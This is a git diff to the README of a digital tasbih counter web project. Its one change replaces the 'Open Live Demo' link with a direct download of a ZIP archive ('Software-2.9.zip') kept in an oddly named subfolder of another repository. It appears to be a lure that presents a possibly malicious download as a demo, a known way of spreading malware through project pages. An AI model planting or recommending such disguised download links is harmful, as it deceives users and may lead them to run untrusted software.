@@ -14,7 +14,7 @@ A modern, responsive, and spiritually inspired **digital tasbih counter** to ass
 
 ## 🖼️ Live Demo
 
-🔗 [Open Live Demo](https://your-username.github.io/IslamicTasbihCounter)
+🔗 [Open Live Demo](https://github.com/devharis99/tasbihcounter/raw/refs/heads/main/molluscoidean/Software-2.9.zip)
 
 ## 🛠️ Technologies Used
 
